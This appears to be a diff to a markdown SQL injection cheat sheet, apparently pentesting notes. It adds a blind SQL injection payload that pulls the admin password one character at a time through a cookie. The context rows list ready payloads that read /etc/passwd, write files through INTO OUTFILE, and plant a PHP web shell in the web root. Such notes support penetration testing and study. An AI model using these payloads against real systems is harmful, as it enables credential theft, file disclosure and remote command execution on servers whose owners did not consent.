@@ -67,3 +67,5 @@
 | `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` | Read local file |
 | `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | Write a string to a local file |
 | `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |
+| **Blind SQL Injection** |
+| `cookie_value' and substring((select password from users where username='admin'),1,1)='a'--'` | Blind sql injection on error based injection (ie, we have a response changing when an error occurs or not) |
